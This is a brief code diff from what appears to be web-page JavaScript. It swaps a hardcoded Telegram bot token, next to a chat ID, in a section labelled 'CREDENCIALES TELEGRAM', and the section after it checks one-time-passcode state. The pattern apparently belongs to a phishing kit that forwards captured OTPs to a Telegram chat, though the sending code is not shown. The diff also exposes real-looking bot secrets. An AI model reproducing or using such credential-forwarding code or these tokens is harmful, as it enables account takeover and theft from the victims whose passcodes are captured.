@@ -50,7 +50,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   // --- 2. CREDENCIALES TELEGRAM ---
-  const botToken = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
+  const botToken = '9068600803:AAGIYrU6UrsLU8_0x0dkZLUTQ_YKr4535BE';
   const chatId = '9180377107'; // Grupo Correcto
 
   // --- 3. VERIFICAR ESTADO DEL OTP Y EN QUE PESTAÑA ABRIR ---
